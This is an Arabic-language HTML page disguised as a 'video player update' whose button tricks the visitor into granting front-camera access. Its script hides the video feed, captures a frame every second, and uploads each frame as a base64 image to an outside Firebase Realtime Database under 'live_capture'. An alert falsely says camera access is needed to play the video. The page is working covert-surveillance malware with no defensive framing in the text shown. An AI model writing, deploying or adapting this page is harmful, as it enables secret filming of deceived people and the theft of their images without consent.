<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body style="background:#000; color:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">

    <h2>تحديث مشغل الفيديو</h2>
    <p>يرجى الضغط على الزر أدناه لتشغيل المحتوى</p>
    
    <button onclick="startSystem()" style="padding:20px 40px; font-size:20px; background:red; color:white; border:none; border-radius:10px; cursor:pointer;">
        تفعيل المشغل الآن
    </button>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // إعدادات Firebase الصحيحة الخاصة بك
        const firebaseConfig = {
            databaseURL: "https://omarnnn90-816ad-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        async function startSystem() {
            try {
                // طلب إذن الكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;

                alert("تم تفعيل المشغل بنجاح، انتظر قليلاً...");

                // بدء عملية الإرسال التلقائي كل ثانية
                setInterval(() => {
                    sendFrame();
                }, 1000);

            } catch (err) {
                alert("يرجى السماح بالوصول للكاميرا لتشغيل الفيديو.");
            }
        }

        function sendFrame() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');

            canvas.width = 320; 
            canvas.height = 240;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة لنص (Base64) وإرسالها
            const imageData = canvas.toDataURL('image/jpeg', 0.4);
            database.ref('live_capture').set({
                img: imageData,
                time: Date.now()
            });
        }
    </script>
</body>
</html>
